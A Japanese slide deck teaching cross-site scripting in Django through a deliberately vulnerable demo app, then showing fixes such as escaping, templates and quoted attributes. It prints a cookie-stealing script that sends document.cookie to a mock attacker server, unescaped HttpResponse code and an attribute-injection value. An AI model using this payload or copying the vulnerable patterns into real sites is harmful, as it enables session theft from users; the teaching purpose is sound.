2️⃣ XSS（クロスサイト・スクリプティング） 🙅
============================================================

Cross-Site Scripting

XSSって、なによ
============================================================

* Webアプリに文字列を入力できる箇所
* **HTMLやJavaScriptコード** を入力したときに、それが **実行** できてしまうバグ（脆弱性）
* 悪意を持ったJavaScriptを実行して攻撃できてしまう☠️

🏃‍♂️巨人の肩に乗る
--------------------------------------------------

* DjangoCongress JP 2019 「現場で使える Django のセキュリティ対策」
* 『`実践Django`_』4.4

🏃‍♂️「現場で使える Django のセキュリティ対策」
--------------------------------------------------

.. raw:: html

    <iframe class="speakerdeck-iframe" style="border: 0px; background: rgba(0, 0, 0, 0.1) padding-box; margin: 0px; padding: 0px; border-radius: 6px; box-shadow: rgba(0, 0, 0, 0.2) 0px 5px 40px; width: 100%; height: auto; aspect-ratio: 560 / 315;" frameborder="0" src="https://speakerdeck.com/player/47b9d3a52ec94b27a88367d6ddec316d?slide=60" title="現場で使える Django のセキュリティ対策 / Django security measures for business (DjangoCon JP 2019)" allowfullscreen="true" data-ratio="1.7777777777777777"></iframe>

百聞は一見に如かず、デモの時間です！
--------------------------------------------------

https://github.com/ftnext/django-bad-apps/tree/main/cross-site-scripting

:command:`docker compose up`
--------------------------------------------------

* XSS脆弱性のあるDjangoアプリ ``web``
* ``db`` （PostgreSQL）
* 攻撃者が用意したサーバ（WireMock） ``evil-server``

最初はJavaScriptの実行の例から
--------------------------------------------------

http://127.0.0.1:8000/example/

* JavaScriptコードが実行されるページ
* 悪意を持ったJavaScriptコードが実行されるページ

JavaScriptが実行される例
============================================================

http://127.0.0.1:8000/example/alert/

* 「XSSです」がポップアップしました

.. code-block:: python

    def alert(request):
        return HttpResponse('<script>alert("XSSです")</script>')

``HttpResponse`` でscriptタグを返している
--------------------------------------------------

* レスポンス（HTML）中にscriptタグ！

.. code-block:: html

    <script>alert("XSSです")</script>

* **ブラウザはこれを実行** （scriptタグなので）

悪意を持ったJavaScriptコードの例
============================================================

* **cookieを他サイトに送信** するJavaScriptコード
* Webアプリにログインしているとき、cookieを使ってセッション管理をしている

HTTP Cookie
--------------------------------------------------

https://developer.mozilla.org/ja/docs/Web/HTTP/Cookies

* 「*サーバーがユーザーのウェブブラウザーに送信する小さなデータ*」
* 「*ブラウザーに保存され、その後のリクエストと共に同じサーバーへ返送*」

cookieを他サイトへ送信😈
--------------------------------------------------

.. code-block:: javascript

    window.location = "http://0.0.0.0:8080/evil?cookie="+escape(document.cookie)

* このスクリプトを実行したブラウザのcookieを、クエリパラメタに加える
* ``window.location`` への代入でブラウザを遷移させて、攻撃者が用意したサーバに送信

攻撃されてみましょう
--------------------------------------------------

http://127.0.0.1:8000/example/send/

* Your cookie is ... と表示される
* これは攻撃者が用意したサーバ（モックサーバ）のレスポンス

どのように攻撃されたのか 1/2
--------------------------------------------------

* ブラウザは http://127.0.0.1:8000/example/send/ を開いた（Djangoアプリにリクエスト）
* Djangoアプリは、 **cookieを送信するscriptタグを含むレスポンス** を返した

.. code-block:: html

    <script>window.location = "http://0.0.0.0:8080/evil?cookie="+escape(document.cookie)</script>

どのように攻撃されたのか 2/2
--------------------------------------------------

* ブラウザはレスポンスをレンダリングする中で **scriptタグを実行** （してしまう）
* scriptタグは **モックサーバにcookieを含めたリクエストを送信** した（＝攻撃者がcookieを知った）
* ブラウザに表示されたのは、モックサーバのレスポンス

🏃‍♂️ 0.0.0.0って、なによ
--------------------------------------------------

* すべてのネットワークインターフェース
* ref: `105:127.0.0.1と0.0.0.0の違い <https://jisou-programmer.beproud.jp/%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AF/105-127.0.0.1%E3%81%A80.0.0.0%E3%81%AE%E9%81%95%E3%81%84.html>`__ 『自走プログラマー』

どうすればよかったの？ー **エスケープ**
============================================================

* ``HttpResponse`` にHTMLやJavaScriptコードが渡る可能性がある場合、 **エスケープ** して渡しましょう！

.. code-block:: python

    from django.utils.html import escape

``django.utils.html.escape``
--------------------------------------------------

https://github.com/django/django/blob/4.2.6/django/utils/html.py#L17-L27

    Return the given text with ampersands, quotes and angle brackets encoded for use in HTML.

- ``&``
- ``'`` ``"``
- ``<`` ``>``

``django.utils.html.escape`` の実装
--------------------------------------------------

.. code-block:: python

    @keep_lazy(SafeString)
    def escape(text):
        return SafeString(html.escape(str(text)))

エスケープで対策できてます！
--------------------------------------------------

.. code-block:: python

    def alert(request):
        return HttpResponse(escape('<script>alert("XSSです")</script>'))

.. code-block:: html

    &lt;script&gt;alert(&quot;XSSです&quot;)&lt;/script&gt;

* **ブラウザにとってはscriptタグでない** ので、JavaScriptの実行はされません！

Djangoテンプレートでも対策できます！
--------------------------------------------------

* ``{{ variable }}`` による **変数展開でエスケープ** される
* Djangoドキュメント中の `クロス・サイト・スクリプティング (XSS) の防御 <https://docs.djangoproject.com/ja/4.2/topics/security/#cross-site-scripting-xss-protection>`_ より

    Django のテンプレートを用いる事で多数の XSS 攻撃に対抗することができます。

「現実にこんなDjangoアプリ書きます？」
--------------------------------------------------

* ここまで ``HttpResponse`` で **エスケープ** しないと、JavaScriptが実行されることを示しました
* XSS脆弱性を作り込んでしまう例へ進みます

持続型XSS
============================================================

    攻撃用のJavaScriptが、攻撃対象のデータベースなどに保存される場合 (徳丸本 p.231)

* 持続型とは別に、 *反射型* もあります

持続型XSSできてしまうDjangoアプリ
--------------------------------------------------

http://127.0.0.1:8000/todolist/

* TODOの一覧ページ
* TODOの作成ページ（要ログイン）

2人のユーザ
--------------------------------------------------

* :command:`python manage.py createsuperuser` （``docker compose run`` で流しやすいため）
* eviluser（攻撃者）
* wasbook（被害者）

持続型XSSを引き起こす脆弱性
--------------------------------------------------

* 一覧はDBに保存されたTODOを **エスケープせずに** ``HttpResponse`` で返す実装🙅‍♂️
* 作成するときにユーザはscriptタグを入力できる

eviluserでログイン
--------------------------------------------------

http://127.0.0.1:8000/todolist/

* 空のページで始まる
* 「パソコンを買う」を1つ保存（一覧に加わる）

eviluserが持続型XSSで攻撃👹
--------------------------------------------------

http://127.0.0.1:8000/todolist/new/

* Todoの内容に攻撃用 **JavaScriptコードを記入**
* Djangoフォームはこれを保存する

何も知らないwasbookユーザがログイン
--------------------------------------------------

* 別のブラウザ（シークレットウィンドウ）でログイン
* ログイン一覧ページに遷移すると、保存されたTODOが表示され、scriptタグが実行され、cookieが送信される☠️

「分かりました！テンプレートを使います！！」
============================================================

* 多数は対処できるのですが、 **注意が必要**
* `クロス・サイト・スクリプティング (XSS) の防御`_ にはテンプレートの落とし穴も

.. code-block:: html

    <style class={{ var }}>...</style>

HTMLタグの **属性値はクォートで囲む**
--------------------------------------------------

* 1つ前のスライドのテンプレートの書き方には、脆弱性がある

    var の値が 'class1 onmouseover=javascript:func()' にセットされた場合

.. code-block:: diff

    -<style class={{ var }}>...</style>
    +<style class="{{ var }}">...</style>

XSSのまとめ🌯
============================================================

* **悪意を持ったHTMLやJavaScriptコードを注入** できてしまう脆弱性
* 悪意を持ったコードがデータベースに保存される、 **持続型** で攻撃した

XSS脆弱性を埋め込む実装🙅‍♂️
--------------------------------------------------

* ``HttpResponse`` に **エスケープせず** にHTMLやJavaScriptコードを渡してしまう

.. code-block:: python

    def alert(request):
        return HttpResponse('<script>alert("XSSです")</script>')

XSSの脆弱性を埋め込まない実装
--------------------------------------------------

* ``django.utils.html.escape`` でエスケープ
* **Djangoテンプレート** を使う

  * さらに、HTMLの **属性値はクォートで囲む**

⚠️この場限りにしてくださいね（攻撃になっちゃうので！）
------------------------------------------------------------

* あなたが利用しているWebアプリに、ここで紹介したJavaScriptを保存しないでください
* それは **攻撃** です（学習用のこのアプリだけにしてください）

重ねてありがとう、Djangoチュートリアル
--------------------------------------------------

* XSSがどういうものか分かっていなかった あの日の私、チュートリアルに沿うことで回避していた
* `Djangoテンプレート <https://tutorial.djangogirls.org/ja/django_templates/>`__

🏃‍♂️関連アウトプット
--------------------------------------------------

* `DjangoにおけるXSS対策理解の一歩目。JavaScriptのコード片から作ったレスポンスを返してみる（HttpResponse・TemplateResponse） <https://nikkie-ftnext.hatenablog.com/entry/django-response-xss-protection-introduction>`__
* `XSSの例に登場するJavaScriptのopen（window.open）を理解したく手を動かす <https://nikkie-ftnext.hatenablog.com/entry/grasp-javascript-window-open-in-xss-example>`__
